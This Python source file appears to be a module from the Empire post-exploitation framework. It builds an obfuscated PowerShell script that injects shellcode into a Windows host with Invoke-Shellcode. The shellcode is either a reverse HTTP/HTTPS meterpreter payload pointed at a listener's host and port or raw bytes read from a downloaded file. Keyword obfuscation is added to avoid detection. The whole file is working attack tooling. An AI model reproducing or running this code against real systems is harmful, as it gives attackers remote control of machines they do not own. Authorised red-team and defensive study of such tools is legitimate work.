from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False,
                 obfuscation_command: str = ""):

        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
        if main_menu.obfuscate:
            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
            if pathlib.Path(obfuscated_module_source).is_file():
                module_source = obfuscated_module_source

        try:
            with open(module_source, 'r') as f:
                module_code = f.read()
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
                                         obfuscationCommand=main_menu.obfuscateCommand)
        else:
            script = module_code

        script_end = "\nInvoke-Shellcode -Force"

        listener_name = params['Listener']
        if listener_name != "":
            if not main_menu.listeners.is_listener_valid(listener_name):
                return handle_error_message("[!] Invalid listener: " + listener_name)
            else:
                # TODO: redo pulling these listener configs...
                # Old method no longer working
                # temporary fix until a more elegant solution is in place, unless this is the most elegant???? :)
                # [ID,name,host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,listener_type,redirect_target,default_lost_limit] = main_menu.listeners.get_listener(listener_name)
                host = main_menu.listeners.loadedListeners['meterpreter'].options['Host']
                port = main_menu.listeners.loadedListeners['meterpreter'].options['Port']

                MSFpayload = "reverse_http"
                if "https" in host:
                    MSFpayload += "s"

                hostname = host.split(":")[1].strip("/")
                params['Lhost'] = str(hostname)
                params['Lport'] = str(port)
                params['Payload'] = str(MSFpayload)

        for option, values in params.items():
            if option.lower() != "agent" and option.lower() != "listener":
                if values and values != '':
                    if option.lower() == "payload":
                        payload = "windows/meterpreter/" + str(values)
                        script_end += " -" + str(option) + " " + payload
                    elif option.lower() == "shellcode":
                        # transform the shellcode to the correct format
                        sc = ",0".join(values.split("\\"))[0:]
                        script_end += " -" + str(option) + " @(" + sc + ")"
                    elif option.lower() == "file":
                        with open(f"{main_menu.installPath}/downloads/{values}", 'rb') as bin_data:
                            shellcode_bin_data = bin_data.read()
                        sc = ''
                        for x in range(len(shellcode_bin_data)):
                            sc += "0x{:02x}".format(shellcode_bin_data[x]) + ','
                        script_end += f' -shellcode @({sc[:-1]})'
                    else:
                        script_end += " -" + str(option) + " " + str(values)

        script_end += "; 'Shellcode injected.'"

        if main_menu.obfuscate:
            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
